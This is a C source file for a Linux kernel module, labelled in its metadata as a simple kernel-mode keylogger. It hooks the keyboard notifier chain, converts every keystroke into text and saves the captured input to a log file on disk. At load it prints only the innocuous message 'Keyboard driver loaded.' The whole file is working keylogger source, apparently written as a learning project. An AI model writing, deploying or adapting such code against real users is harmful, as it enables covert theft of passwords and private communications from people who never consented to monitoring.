#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>
#include <linux/input.h>
#include <linux/fs.h>
#include <linux/file.h>

#include "headers.h"

/*
    Helpful sources:
        https://medium.com/@emanuele.santini.88/developing-a-linux-kernel-module-keylogger-6c3922d72f9d
*/
MODULE_LICENSE("GPL");
MODULE_AUTHOR("wizarddos");
MODULE_DESCRIPTION("Simple kernel-mode Keylogger");


char queued_chars[MAX_SIZE];

static size_t resolve_keycode(int keycode, int is_shift, char *buffer, size_t buffer_size){
    memset(buffer, 0x0, buffer_size);
    
    if(keycode > KEY_RESERVED && keycode  <= KEY_PAUSE){
        const char *pressed_key = (is_shift == 1) ? us_keymap[keycode][1] : us_keymap[keycode][0];
        snprintf(buffer, buffer_size, "%s", pressed_key);
        return strlen(buffer);
    }

    return 0;
}

static ssize_t write_to_file(char *buffer) {
    printk(KERN_DEBUG "Writing buffer %s", buffer);

    struct file *file;
    ssize_t ret = 0, len = 0;

    file = filp_open(FILE_PATH, O_RDWR | O_CREAT, 0644);
    if (IS_ERR(file)) {
        printk(KERN_DEBUG "Failed to open log file");
        return PTR_ERR(file);
    }

    len = kernel_write(file, buffer, strlen(buffer), &file->f_pos);
    if (len < 0) {
        printk(KERN_DEBUG "Failed to write into file: %zd", len);
        ret = len;
        goto finish;
    }

    printk(KERN_DEBUG "Saved %zd bytes to %s", len, FILE_PATH);
    ret = len;

finish:
    filp_close(file, NULL);
    return ret;
}


static int keyboard_notifier_callback(struct notifier_block *nb, unsigned long action, void *nb_ptr) {
    /*
        *nb -> notifier_block struct
        action -> What keyboard is being recorded
        data -> pointer to nb
    */
    struct keyboard_notifier_param *keyboard_event = (struct keyboard_notifier_param *)nb_ptr; // Cast pointer to correct type
    
    char character_buff[BUFF_SIZE];
    memset(character_buff, 0x0, BUFF_SIZE);

    size_t keystr_len = resolve_keycode(
        keyboard_event->value, 
        keyboard_event->shift, 
        character_buff, 
        BUFF_SIZE
    );
    
    // Why down? This way we ommit showing a character 2 times
    if ((keystr_len >= 1) && !(keyboard_event->down)) {
        size_t curr_len = strlen(queued_chars);
        size_t new_len = strlen(character_buff);
        size_t total_needed = curr_len + 1 + new_len + 1;  // space + null terminator
    
        if (total_needed >= MAX_SIZE) {
            ssize_t return_val = write_to_file(queued_chars);
            if (return_val >= 0) {
                memset(queued_chars, 0, MAX_SIZE);
                snprintf(queued_chars, MAX_SIZE, "%s", character_buff);  // always re-add after flush
            }
        } else {
            snprintf(queued_chars, MAX_SIZE, "%s%s", queued_chars, character_buff);
        }
    }
    return NOTIFY_OK;
}

static struct notifier_block nb = {
    .notifier_call = keyboard_notifier_callback
};

static int __init keyboard_init(void) {
    printk(KERN_INFO "Keyboard driver loaded.\n");
    register_keyboard_notifier(&nb);
    return 0;
}

static void __exit keyboard_exit(void) {
    unregister_keyboard_notifier(&nb);
    if(strlen(queued_chars) > 0){
        size_t len = write_to_file(queued_chars);
        if(len < 0){
            printk(KERN_DEBUG "Failed to save to the buffer");
        }
    }
    printk(KERN_INFO "Keyboard driver unloaded.\n");
}

module_init(keyboard_init);
module_exit(keyboard_exit);
